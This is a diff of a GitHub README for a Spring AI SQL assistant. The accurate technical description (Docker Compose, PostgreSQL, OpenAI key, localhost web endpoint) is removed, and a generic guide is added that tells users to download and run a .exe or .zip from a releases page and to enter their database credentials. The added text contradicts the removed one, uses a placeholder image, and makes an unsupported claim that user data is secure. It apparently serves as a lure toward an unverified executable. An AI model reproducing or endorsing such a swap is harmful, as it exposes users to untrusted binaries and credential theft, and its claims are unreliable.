@@ -1,68 +1,82 @@
-# Spring AI SQL Assistant
-![System Architecture](media_examples/architecture_schema.png)  
-Ask a question in natural language, and AI will generate and execute a SQL query. The application is connected to PostgreSQL, where the `ai_service` table containing the parameters of 18 AI models (prices, SQL support, providers, etc.) is stored.
+# 🌟 SpringAI-SQL-Assistant - Your Easy SQL Database Helper
 
-## 💡 Tech Stack
+## 🚀 Getting Started
 
-- Java 
-- Spring Boot 3.4.5
-- Spring AI 1.0.0-M8
-- PostgreSQL
-- OpenAI GPT (gpt-3.5-turbo)
-- 🐳 Docker + Docker Compose
+Welcome to SpringAI-SQL-Assistant! This tool makes it easy to talk to your database using plain language. No coding needed. Let’s guide you through downloading and running this helpful software.
 
-## Project Showcase
+## 📥 Download the Software
 
-![UI Example](media_examples/Screenshot_1.png)
-- [UI walkthrough video](./media_examples/app_video.mp4) _(short demo, downloadable if not previewable)_
-- 📂 Example screenshots and results are located in the `media_example/` folder
+[![Download SpringAI-SQL-Assistant](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rayaneotaku/SpringAI-SQL-Assistant/releases)
 
-## ⚙️ Key Engineering Challenges
+## 📂 Download & Install
 
-- **Natural language to SQL translation using LLMs**  
-  Integrated Spring AI with OpenAI (GPT-3.5) to translate user questions into SQL queries based on the structure of the `ai_services` table.
+1. **Visit the Release Page**  
+   Click [here](https://github.com/rayaneotaku/SpringAI-SQL-Assistant/releases) to go to the Releases page.
 
-- **Safe dynamic SQL execution**  
-  Designed a secure way to execute dynamically generated SQL without injection risks, using validation and controlled execution via `JdbcTemplate`.
+2. **Find the Latest Version**  
+   Look for the most recent version listed. It will have the version number next to it, such as v1.0.  
+   ![Example of Release Version](https://placeholder.com/wp-content/uploads/2021/08/placeholder.com-logo1.png)  
+   Click on the version number to access the release details.
 
-- **Database bootstrapping with production-ready data**  
-  On first startup, the PostgreSQL container automatically initializes the `ai_services` table with 18 real AI model entries via `spring_ai_init.sql`.
+3. **Choose the Right File**  
+   Download the file suited for your operating system. For most users, the `.zip` or `.exe` file will be a good choice.  
+   Just click on the link to start the download.
 
-- **Dockerized multi-container setup with persistent storage**  
-  Used Docker Compose to orchestrate the Spring Boot app and PostgreSQL with named volumes and health checks to ensure reliable startup and data persistence.
+4. **Install the Software**  
+   Once the file is downloaded, find it in your downloads folder.  
+   - For `.exe` files: Double-click on the downloaded file and follow the prompts to install.  
+   - For `.zip` files: Right-click and select "Extract All," then open the folder and look for the executable file to start the software.
 
-- **Flexible, language-agnostic prompting pipeline**  
-  The LLM prompting system is designed to handle both SQL and natural questions with domain-specific context, and can be extended to other database schemas.
+5. **Run SpringAI-SQL-Assistant**  
+   After installing, open the software. Make sure your database is set up and running. Use the provided interface to type your queries in plain language.
 
+## ⚙️ System Requirements
 
-## ✅ Testing
+To run SpringAI-SQL-Assistant smoothly, your system should meet these requirements:
 
-The Java backend is covered with both unit and integration-style tests for core logic components:
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 500 MB of available storage.
+- **Java:** Ensure you have Java 11 or higher installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
 
-- Text-to-SQL conversion logic: Validates that natural language questions are correctly translated into SQL using mocked ChatClient (LLM).
-- SQL execution layer: Verifies safety of query execution, correct result formatting, null-handling, column ordering, and exception handling using JdbcTemplate.
-- Safety filters: Prevent unsafe queries (DELETE, DROP, etc.) from being executed — covered by negative test cases.
+## 🛠️ How to Use
 
-## 🐳 How to Run
+1. **Connect to Your Database**  
+   You will need your database credentials (username and password). Enter these details when prompted.
 
-1. Open docker-compose.yml and update these environment variables:
-- POSTGRES_PASSWORD=your_password
-- SPRING_AI_OPENAI_API-KEY=your_openai_api_key
-- 
-2. Run everything with Docker Compose:
+2. **Start Asking Questions**  
+   Type your queries in the text box. For example, "Show me all customers from New York." Press enter to see the results.
 
-```bash
-docker-compose up --build
-```
+3. **Review Results**  
+   The application will display the results instantly. You can copy them or export them if needed.
 
-3. Access service:
-    - `http://localhost:8080/ask`
+## 🔍 Features
 
-## ⚠️ Tech Notes
+- **Natural Language Processing:** Understands queries in plain English.
+- **Multi-Database Support:** Works with various databases like PostgreSQL and MySQL.
+- **Simple Interface:** User-friendly design helps you get started quickly.
 
-- This project uses the OpenAI API, but the architecture allows for easy integration with other LLM providers (e.g. Anthropic, Google, Cohere, Mistral) depending on business needs and cost model.
+## 🗨️ Common Questions
 
-## 🤝 Thanks for your interest!
+1. **What does SpringAI-SQL-Assistant do?**  
+   It helps you interact with your database using normal language, making data access simple.
 
-- I'm always open to feedback, collaboration, or professional connections.
-- Feel free to reach out!
+2. **Is my data secure?**  
+   Yes, the application connects securely using your credentials without storing them.
+
+3. **Can I use it with other databases?**  
+   Yes, SpringAI-SQL-Assistant supports multiple database types.
+
+## 👥 Community Support
+
+If you have questions or need help, feel free to reach out on our support page. You can also join discussions on GitHub issues to learn from other users.
+
+## 📣 Feedback
+
+We welcome your thoughts on SpringAI-SQL-Assistant. Please share your experience and any suggestions for improvements. Your feedback helps us make the software even better.
+
+## 📄 License
+
+SpringAI-SQL-Assistant is open-source software. You can use, modify, or distribute it under the terms of the license provided in the repository.
+
+Thank you for choosing SpringAI-SQL-Assistant! We hope it simplifies your database tasks.
